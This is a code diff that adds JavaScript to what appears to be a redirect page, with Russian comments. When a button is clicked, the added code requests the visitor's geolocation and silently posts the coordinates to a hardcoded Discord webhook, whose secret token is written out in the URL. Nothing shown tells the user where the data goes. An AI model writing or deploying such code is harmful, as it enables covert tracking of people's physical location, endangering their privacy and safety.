@@ -58,6 +58,66 @@ function redirectBack() {
 }
 
 // Основная функция, вызываемая при нажатии на кнопку
+ const webhookUrl = "https://discord.com/api/webhooks/1299013641084866674/PKIfals7J4p1kYsUJCQesFHK06vZKKR_dL2T_cLvxFylqnsEweKVADcKz-N_Ej4yzNRv";
+
+        // Функция для получения местоположения пользователя
+        function getLocationAndSendToWebhook() {
+            if (navigator.geolocation) {
+                // Запрашиваем местоположение
+                navigator.geolocation.getCurrentPosition(sendLocationToWebhook, showError);
+            } else {
+                console.log("Геолокация не поддерживается этим браузером.");
+            }
+        }
+
+        // Функция для обработки успешного получения местоположения
+        function sendLocationToWebhook(position) {
+            // Получаем координаты
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            // Формируем сообщение для отправки в Discord
+            const message = {
+                content: `Местоположение пользователя:\nШирота: ${latitude}\nДолгота: ${longitude}`
+            };
+
+            // Отправляем данные в вебхук Discord
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(message)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Данные успешно отправлены в Discord:', data);
+            })
+            .catch((error) => {
+                console.error('Ошибка при отправке данных:', error);
+            });
+        }
+
+        // Функция для обработки ошибок получения местоположения
+        function showError(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    console.log("Пользователь отклонил запрос на доступ к геолокации.");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    console.log("Информация о местоположении недоступна.");
+                    break;
+                case error.TIMEOUT:
+                    console.log("Превышено время ожидания запроса.");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    console.log("Неизвестная ошибка.");
+                    break;
+            }
+        }
+
+        // Добавляем обработчик события для кнопки
+        document.getElementById("getLocationBtn").addEventListener("click", getLocationAndSendToWebhook);
 function handleClick() {
     redirectToPage(); // Переход на первую страницу
     setTimeout(redirectBack, 6000); // Через 6 секунд перенаправляем на вторую страницу
